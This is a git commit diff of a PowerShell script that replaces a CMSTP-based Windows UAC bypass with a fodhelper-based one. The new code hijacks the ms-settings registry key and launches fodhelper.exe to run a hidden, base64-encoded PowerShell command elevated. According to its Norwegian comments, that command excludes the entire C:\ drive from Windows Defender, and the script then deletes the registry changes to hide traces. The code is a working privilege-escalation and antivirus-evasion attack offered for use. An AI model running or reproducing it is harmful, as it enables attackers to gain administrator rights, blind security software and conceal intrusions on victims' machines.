3b6f7f37e3a495662679a5b9d29ea331d24b2143
xcode3 <samatar0509@gmail.com>
2025-03-20 01:01:42 +0100

    Update bypass.ps1

--- bypass.ps1
+++ bypass.ps1
@@ -1,45 +1,26 @@
-Function Set-INFFile {
+Function Set-FodhelperBypass {
     [CmdletBinding()]
     Param (
-        [Parameter(HelpMessage="Specify the INF file location")]
-        $InfFileLocation = "$env:temp\CMSTP.inf",
-    
-        [Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
-        [String]$CommandToExecute = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAEMAOgBcAA=='
+        [Parameter(HelpMessage="Specify the command to execute with elevated privileges")]
+        [String]$ElevatedCommand = 'powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAEMAOgBcAA=='
     )
 
-    $InfContent = @"
-[version]
-Signature=`$chicago`$
-AdvancedINF=2.5
+    # Definer registerstien for Fodhelper-bypassen
+    $RegPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
 
-[DefaultInstall]
-CustomDestination=CustInstDestSectionAllUsers
-RunPreSetupCommands=RunPreSetupCommandsSection
+    # Opprett registerbanen og sett kommandoen som skal kjøres
+    New-Item -Path $RegPath -Force | Out-Null
+    Set-ItemProperty -Path $RegPath -Name "(Default)" -Value $ElevatedCommand -Force
+    Set-ItemProperty -Path $RegPath -Name "DelegateExecute" -Value "" -Force
 
-[RunPreSetupCommandsSection]
-$CommandToExecute
-taskkill /IM cmstp.exe /F
+    # Start fodhelper.exe (som vil kjøre kommandoen uten UAC-prompt)
+    Start-Process "C:\Windows\System32\fodhelper.exe"
 
-[CustInstDestSectionAllUsers]
-49000,49001=AllUSer_LDIDSection, 7
-
-[AllUSer_LDIDSection]
-"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
-
-[Strings]
-ServiceName="CorpVPN"
-ShortSvcName="CorpVPN"
-"@
-
-    $InfContent | Out-File $InfFileLocation -Encoding ASCII
+    # Vent litt og slett registerendringene for å skjule spor
+    Start-Sleep -Seconds 3
+    Remove-Item -Path $RegPath -Recurse -Force
 }
 
-Function Get-Hwnd {
-    [CmdletBinding()]
-    Param (
-        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] 
-        [string]$ProcessName
-    )
-    Process {
-       
+# Kjør Fodhelper-bypassen for å ekskludere C:\ fra Defender
+Set-FodhelperBypass
+
